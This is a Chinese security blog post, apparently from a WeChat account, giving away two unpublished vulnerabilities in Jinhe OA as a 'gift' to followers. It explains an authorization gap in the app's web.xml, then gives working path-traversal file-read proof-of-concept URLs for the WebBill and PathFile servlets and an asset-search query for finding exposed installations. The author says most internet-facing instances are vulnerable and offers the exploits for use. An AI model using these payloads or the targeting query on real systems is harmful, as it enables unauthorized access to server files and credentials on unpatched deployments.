#  感谢大家的关注与支持 送两0DAY吧  
Lzer0Kx01  LK安全   2025-06-08 06:12  
  
免责声明  
  
由于传播、利用本公众号所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担。LK  
安全公众号  
及原文章作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢大家！！！  
  
  
请勿利用文章内的相关技术从事非法测试，由于传播，利用此文所提供的信息而造成的任何直接或者间接的后果与损失，均由使用者本人负责，文章作者不为此承担任何责任  
  
  
0x01 前言  
  
前几天随手写的一篇文章，没想到还小爆了一下，给我涨了几百粉丝，哎。。。  
  
没啥东  
西可以送给大家，就送两小day吧，也是顺手挖的，互联网找了一下没有公开，暴露在互联网的资产基本都可以打，本来寻思交某天通用，没想到已经有人交过了。那就送给大家玩吧  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6iaQn0klFE5rvnPuLeFUXlW2DHHuDkia29BZUfThZPyBIWnj073hqMPFDQ/640?wx_fmt=png&from=appmsg "")  
  
0x02 挖掘过程  
  
这套源码在我的电脑里存了至少两年了，也懒得去看，最近黑盒挖洞实在是挖不到，也有可能是懒得挖了，就寻思审计审计，就拿它练手了  
  
Java的站，又是用Servlet又是Struts2又是spring的  
  
解压完还是先看web.xml文件，我的习惯一般都是先看鉴权和路由  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6iaKxlsQlHib3FtSCmcbGNSO1JibEdlOTyNOFBR3qfXJJv8kYzGQz2TzSWQ/640?wx_fmt=png&from=appmsg "")  
  
  
这个Filtre基本上就到位了，匹配到*.action *.jsp *.htm /workBench/*都要走这个逻辑，但是有个很大的问题就是没有匹配/Servlet路径  
  
先看未授权的情况，对这个文件中的servlet挨着看过去，倒是有不少洞，搜了一下基本上都公开了  
  
不过找到一个叫WebBill的Servlet，跟进去看了一下  
  
简单来说这  
个Servlet类用来处理前端发起的各种 HTTP 请求。它的作用类似一个“控制器”，根据请求参数（  
key  
）来分发功能  
  
这其中有个GetFileContent  
  
当   
key=GetFileContent  
 时，Servlet 中会执行以下这段逻辑：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6iaJ55epcxm74iavN6XIwT2k5KaQESTo2mfJ6BEx0DsRoMnrQ36O7JeXnw/640?wx_fmt=png&from=appmsg "")  
  
  
关于这两个参数，在这里定义  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6iaOfLlTkXRBAowSiauQyY1ogrFRPfpt52FxbswnpLULu6U9lqxJFvJtQg/640?wx_fmt=png&from=appmsg "")  
  
realPath  
 是 Web 应用的根目录在服务器文件系统上的绝对路径  
  
sFileName  
 是请求参数   
pathfile  
，用于指定读取的文件路径  
  
当   
key=GetFileContent  
 时，服务器将尝试读取前端传入   
pathfile  
 参数指定的文件，并将其内容返回  
  
所以构造攻击的poc 尝试读取一下web.xml文件  
```
http://127.0.0.1/jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml
```  
  
效果如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6iaictuLtT5xUIFr5Cib6ibGLZqTOlcRpiapTJCbyJicwz6FVxpwq8E6jW1MsA/640?wx_fmt=png&from=appmsg "")  
  
另一处也是相同的，在这里就不分析了，直接把poc给出吧  
```
/jc6/servlet/PathFile?GetUrl
```  
  
  
攻击效果如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7hr8KVhmC6emqTecicXwZE6ia8IzoRcc51tTTgPXOdDPWGicBDsjl0SsUGqn3icZQZoQt4C19b7qIoxpQ/640?wx_fmt=png&from=appmsg "")  
  
  
资产测绘语法  
```
app="金和网络-金和OA" || body="/jc6/platform/sys/login"
```  
  
  
0x03 技术交流  
  
上次有好几个师傅问我，有没有技术交流群聊，我也创建了一个，欢迎各位大佬加入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7gR0Z8XKgMkVh5hf1dfr4Cic15PS7xoeVicPOQdjOIibrZba6osNLtsX6ia2oxwsQ1UYGzzI5tvF04lvg/640?wx_fmt=png&from=appmsg "")  
  
如果群满了 就加下面这位师傅 备注加群 随后会拉大家进群  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aibjdZFMRy7gR0Z8XKgMkVh5hf1dfr4Cic2NQa9HBdiauxhxn2aOhwiayBeQTo4JIRNZZz51L96CGrHZDyAQR2GS6w/640?wx_fmt=png&from=appmsg "")  
  
  
